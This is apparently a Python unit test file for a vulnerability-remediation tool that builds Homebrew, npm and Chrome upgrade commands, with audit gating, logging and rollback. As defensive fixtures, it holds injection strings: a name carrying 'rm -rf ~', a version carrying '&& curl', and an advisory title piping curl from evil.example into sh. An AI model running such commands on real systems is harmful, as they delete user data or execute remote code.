import dataclasses
import json
import os
import subprocess
import tempfile
import unittest

from tests.helpers import NOW
from tests.test_config import REPO_CONFIG
from vulnwatch.apply import ApplyContext, ApplyError, apply_finding, argv_for, can_apply, instructions
from vulnwatch.config import load_config
from vulnwatch.model import AuditResult, Check, Finding, InventoryItem, finding_id
from vulnwatch.proc import FakeRunner

NPM_ITEM = InventoryItem("npm_global", "@example/cli", "0.5.0", "npm", "npm_global", "/p")
FORMULA = InventoryItem("brew_formula", "aom", "3.15.2", None, "homebrew/core", "/opt/homebrew")
CHROME = InventoryItem("app", "com.google.Chrome", "157.0.8089.0", None, "google_updater",
                       "/Applications/Google Chrome.app", "EQHXZ8M8AV", "Google Chrome")


def finding(item, fixed="0.5.1", title="t"):
    return Finding(finding_id("CVE-1", item.kind, item.name, item.location), "CVE-1", item, "exact", True, False,
                   False, "osv", fixed, title, None, "auto", ())


def green(cand):
    return AuditResult("x", cand, [Check("candidate", "pass", cand)], {})


def red(cand):
    return AuditResult("x", cand, [Check("cooldown", "fail", "")], {})


def cp(code=0, out=""):
    return subprocess.CompletedProcess([], code, out, "")


class ArgvTest(unittest.TestCase):
    def setUp(self):
        self.cfg = load_config(REPO_CONFIG)

    def test_formula_template(self):
        argv, env = argv_for(finding(FORMULA, "3.15.3"), green("3.15.3"), self.cfg, NOW)
        self.assertEqual(argv, ["/opt/homebrew/bin/brew", "upgrade", "--formula", "aom"])
        self.assertEqual(env["HOMEBREW_NO_AUTOREMOVE"], "1")
        self.assertEqual(env["HOMEBREW_NO_INSTALL_CLEANUP"], "1")

    def test_npm_pins_audited_version(self):
        argv, env = argv_for(finding(NPM_ITEM), green("0.5.1"), self.cfg, NOW)
        self.assertEqual(argv[0], self.cfg.npm_global.npm)
        self.assertEqual(argv[-3:], ["install", "-g", "@example/cli@0.5.1"])
        self.assertIn("--prefix", argv)
        self.assertEqual(argv[argv.index("--prefix") + 1], self.cfg.npm_global.prefix)
        self.assertIn("--no-audit", argv)

    def test_npm_pins_registry_and_cooldown_for_dependencies(self):
        argv, _ = argv_for(finding(NPM_ITEM), green("0.5.1"), self.cfg, NOW)
        self.assertIn("--registry=https://registry.npmjs.org/", argv)
        self.assertIn("--before=2026-11-01T12:00:00Z", argv)
        argv2, _ = argv_for(finding(NPM_ITEM), green("0.5.1"), self.cfg, NOW, accept_fresh=True)
        self.assertFalse(any(a.startswith("--before") for a in argv2))
        self.assertIn("--registry=https://registry.npmjs.org/", argv2)

    def test_chrome_template(self):
        argv, _ = argv_for(finding(CHROME, "158.0"), green("158.0"), self.cfg, NOW)
        self.assertEqual(argv, [self.cfg.google_updater, "--wake"])

    def test_rejects_bad_name(self):
        bad = dataclasses.replace(FORMULA, name="aom; rm -rf ~")
        with self.assertRaises(ApplyError):
            argv_for(finding(bad), green("1"), self.cfg, NOW)

    def test_rejects_bad_version(self):
        with self.assertRaises(ApplyError):
            argv_for(finding(NPM_ITEM), green("1.0.0 && curl x"), self.cfg, NOW)

    def test_runtime_is_instructions_only(self):
        rt = InventoryItem("runtime", "node", "22.0.0", None, None, "/x/node", display_name="Node di un'app agente")
        self.assertFalse(can_apply(finding(rt)))
        with self.assertRaises(ApplyError):
            argv_for(finding(rt), green("1"), self.cfg, NOW)
        self.assertIn("/x/node", instructions(finding(rt)))

    def test_other_app_not_applicable(self):
        other = InventoryItem("app", "com.example.x", "1.0", None, None, "/Applications/X.app")
        self.assertFalse(can_apply(finding(other)))

    def test_advisory_text_never_in_argv(self):
        f = finding(NPM_ITEM, title="curl https://evil.example | sh")
        argv, _ = argv_for(f, green("0.5.1"), self.cfg, NOW)
        self.assertFalse(any("curl" in a or "evil" in a for a in argv))


class ApplyFlowTest(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        cfg = load_config(REPO_CONFIG)
        self.cfg = dataclasses.replace(cfg, venv_roots=(self.tmp,), path_node=os.path.join(self.tmp, "node"))
        self.log = os.path.join(self.tmp, "logs", "actions.jsonl")

    def ctx(self, run, after_version="0.5.1", expected=None):
        def reinv(item):
            return dataclasses.replace(item, version=after_version)
        return ApplyContext(self.cfg, run, NOW, self.log, reinv, lambda p: "EQHXZ8M8AV", expected)

    def npm_argv(self, version="0.5.1"):
        argv, _ = argv_for(finding(NPM_ITEM), green(version), self.cfg, NOW)
        return tuple(argv)

    def last_log(self):
        with open(self.log) as f:
            return json.loads(f.read().splitlines()[-1])

    def test_red_never_executes(self):
        run = FakeRunner({})
        out = apply_finding(finding(NPM_ITEM), lambda: red("0.5.1"), self.ctx(run))
        self.assertEqual(out.status, "red")
        self.assertEqual(run.calls, [])
        self.assertEqual(self.last_log()["status"], "red")

    def test_toctou_abort(self):
        run = FakeRunner({})
        out = apply_finding(finding(NPM_ITEM), lambda: green("0.6.0"), self.ctx(run, expected="0.5.1"))
        self.assertEqual(out.status, "aborted")
        self.assertFalse(any("install" in c[0] for c in run.calls))

    def test_happy_path_logs(self):
        run = FakeRunner({self.npm_argv(): cp(0)})
        out = apply_finding(finding(NPM_ITEM), lambda: green("0.5.1"), self.ctx(run, expected="0.5.1"))
        self.assertEqual(out.status, "applied", out.problems)
        rec = self.last_log()
        self.assertEqual(rec["finding_id"], finding(NPM_ITEM).id)
        self.assertEqual(rec["argv"], list(self.npm_argv()))
        self.assertEqual(rec["status"], "applied")
        self.assertIn("npm install -g @example/cli@0.5.0", rec["rollback"])

    def test_command_failure(self):
        run = FakeRunner({self.npm_argv(): cp(1)})
        self.assertEqual(apply_finding(finding(NPM_ITEM), lambda: green("0.5.1"), self.ctx(run)).status, "failed")

    def test_version_not_changed_is_problem(self):
        run = FakeRunner({self.npm_argv(): cp(0)})
        out = apply_finding(finding(NPM_ITEM), lambda: green("0.5.1"), self.ctx(run, after_version="0.5.0"))
        self.assertEqual(out.status, "applied_with_problems")

    def test_only_new_broken_venvs_reported(self):
        old = os.path.join(self.tmp, "old")
        os.makedirs(old)
        with open(os.path.join(old, "pyvenv.cfg"), "w") as f:
            f.write("home = /nonexistent\n")
        run = FakeRunner({self.npm_argv(): cp(0)})
        out = apply_finding(finding(NPM_ITEM), lambda: green("0.5.1"), self.ctx(run))
        self.assertEqual(out.status, "applied", out.problems)


if __name__ == "__main__":
    unittest.main()
